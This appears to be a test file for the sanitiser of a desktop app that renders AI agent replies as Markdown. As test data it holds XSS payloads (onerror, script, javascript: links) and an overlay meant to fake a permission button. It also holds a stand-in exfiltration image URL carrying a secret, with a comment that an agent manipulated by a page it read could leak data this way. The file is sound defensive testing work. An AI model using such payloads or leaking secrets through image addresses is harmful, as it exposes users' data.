import { openUrl } from '@tauri-apps/plugin-opener';
import { describe, expect, it, vi } from 'vitest';

// The system's browser is never started: what it was asked to open is looked at.
vi.mock('@tauri-apps/plugin-opener', () => ({ openUrl: vi.fn(async () => {}) }));

import { setLang } from './i18n';
import { handleMarkdownClick, renderMarkdown } from './markdown';

function dom(md: string) {
  const d = document.createElement('div');
  d.innerHTML = renderMarkdown(md);
  return d;
}

describe('renderMarkdown', () => {
  it('renders GFM: emphasis, lists, tables and task lists', () => {
    const d = dom('**gras** et `code`\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |');
    expect(d.querySelector('strong')?.textContent).toBe('gras');
    expect(d.querySelector('code')?.textContent).toBe('code');
    expect(d.querySelectorAll('li')).toHaveLength(2);
    expect(d.querySelector('td')?.textContent).toBe('1');
  });

  it('wraps fenced code with its language and a copy button, escaping the code', () => {
    const d = dom('```ts\nconst a = "<b>" && 1;\n```');
    const pre = d.querySelector('pre')!;
    expect(pre.dataset.lang).toBe('ts');
    expect(pre.querySelector('.copy-btn')).not.toBeNull();
    expect(pre.querySelector('code')?.textContent).toBe('const a = "<b>" && 1;');
    expect(pre.querySelector('b')).toBeNull();
  });

  it('strips scripts, event handlers and javascript: links from model output', () => {
    const d = dom(
      '<img src=x onerror="alert(1)"><script>alert(2)</script>[clic](javascript:alert(3)) <iframe src="https://evil"></iframe>',
    );
    expect(d.querySelector('script')).toBeNull();
    expect(d.querySelector('iframe')).toBeNull();
    expect(d.querySelector('[onerror]')).toBeNull();
    const a = d.querySelector('a');
    expect(a?.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
  });

  it('drops inline styles and classes so a reply cannot overlay the app (e.g. a fake permission button)', () => {
    const d = dom('<div style="position:fixed;inset:0;z-index:99" class="card pending">Refuser</div>');
    expect(d.querySelector('[style]')).toBeNull();
    expect(d.querySelector('.pending')).toBeNull();
    expect(d.textContent).toContain('Refuser');
  });

  it('marks links as noopener', () => {
    expect(dom('[doc](https://example.com)').querySelector('a')?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});

describe('handleMarkdownClick', () => {
  it('leaves the links to guardLinks: it neither opens nor stops a click on one, or the link would open twice', () => {
    vi.mocked(openUrl).mockClear();
    const preventDefault = vi.fn();
    for (const md of ['[doc](https://example.com)', '[vide]()', '[ancre](#x)']) {
      handleMarkdownClick({ target: dom(md).querySelector('a'), preventDefault } as unknown as MouseEvent);
    }
    expect(openUrl).not.toHaveBeenCalled();
    expect(preventDefault).not.toHaveBeenCalled();
  });
});

describe('the texts of the code blocks', () => {
  const block = '```\nplain\n```';
  const head = (d: HTMLElement) => [d.querySelector('.code-head span')?.textContent, d.querySelector('.copy-btn')?.textContent];

  it('are in the language of the interface, and a rendering is not reused in another', () => {
    expect(head(dom(block))).toEqual(['texte', 'Copier']);
    setLang('en');
    expect(head(dom(block))).toEqual(['text', 'Copy']);
    setLang('fr');
    expect(head(dom(block))).toEqual(['texte', 'Copier']);
  });

  it('say the code was copied, then go back to the copy button', () => {
    vi.useFakeTimers();
    const writeText = vi.fn();
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText } });
    try {
      setLang('en');
      const d = dom(block);
      const button = d.querySelector<HTMLElement>('.copy-btn')!;
      handleMarkdownClick({ target: button, preventDefault() {} } as unknown as MouseEvent);
      expect(writeText).toHaveBeenCalledWith('plain');
      expect(button.textContent).toBe('Copied ✓');
      vi.advanceTimersByTime(1300);
      expect(button.textContent).toBe('Copy');
    } finally {
      vi.useRealTimers();
      Reflect.deleteProperty(navigator, 'clipboard');
    }
  });
});

describe('the images of a message (ESC-171)', () => {
  it('never gives the webview an image of the web to load: its text, its domain and « Afficher l’image »', () => {
    // An agent led by a page it read could write a secret in the address: loading it would send it.
    const md = '![vue](https://evil.example/a.png?d=SECRET) et ![](https://cdn.example.org/x.gif) <img src="https://evil.example/b.png">';
    const html = renderMarkdown(md);
    expect(html).not.toMatch(/<img[^>]*src=["']?https:/i);
    const d = dom(md);
    expect(d.querySelectorAll('img[src]')).toHaveLength(0);
    const labels = [...d.querySelectorAll<HTMLElement>('[data-remote-src]')];
    expect(labels.map((l) => l.dataset.remoteSrc)).toEqual(['https://evil.example/a.png?d=SECRET', 'https://cdn.example.org/x.gif']);
    expect(labels[0].textContent).toBe('vue · image de evil.example Afficher l’image');
    expect(labels[1].querySelector('button[data-show-img]')?.textContent).toBe('Afficher l’image');
    setLang('en');
    expect(dom('![a](https://example.com/a.png)').querySelector('[data-remote-src]')?.textContent).toBe(
      'a · image from example.com Show image',
    );
    setLang('fr');
    const http = dom('![x](http://example.com/a.png)');
    expect(http.querySelector('img')).toBeNull();
    expect(http.querySelector('[data-img-off]')?.textContent).toBe('x');
  });

  it('leaves a local path for the core to read, by the agent (`data-local-src`)', () => {
    for (const src of ['C:/w/.impeccable/tmp/a.png', '/home/me/a.png', 'shots/a.png', 'file:///C:/w/a%20b.png']) {
      const d = dom(`![vue](${src})`);
      expect(d.querySelector('img'), src).toBeNull();
      expect(d.querySelector<HTMLElement>('[data-local-src]')?.dataset.localSrc, src).toBe(src);
      expect(d.querySelector('[data-local-src]')?.textContent, src).toBe('vue');
    }
  });
});
